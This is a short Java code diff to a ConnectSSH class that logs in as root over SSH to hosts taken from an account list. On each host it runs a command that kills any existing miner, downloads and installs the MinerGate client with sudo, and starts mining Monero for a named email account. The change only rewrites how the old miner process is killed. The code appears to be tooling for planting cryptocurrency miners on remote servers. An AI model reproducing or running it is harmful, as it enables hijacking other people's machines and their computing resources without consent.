@@ -19,8 +19,8 @@ public class ConnectSSH {
     public void connectSSH(AccountInfo accountInfo ,Session session ) {
         
         try {
-            String cmd = "sudo pkill -f minergate-cli || sudo apt-get -y update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb && minergate-cli -user lisatthu35@gmail.com -xmr 1";
-            
+            String cmd = "ps -ef | grep minergate-cli | grep -v grep | awk '{print $2}' | xargs -r kill -9 && sudo apt-get -y update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb && minergate-cli -user lisatthu35@gmail.com -xmr 1"; 
+        
             String host = accountInfo.getIp();
             String user = "root";
             int port = 22;
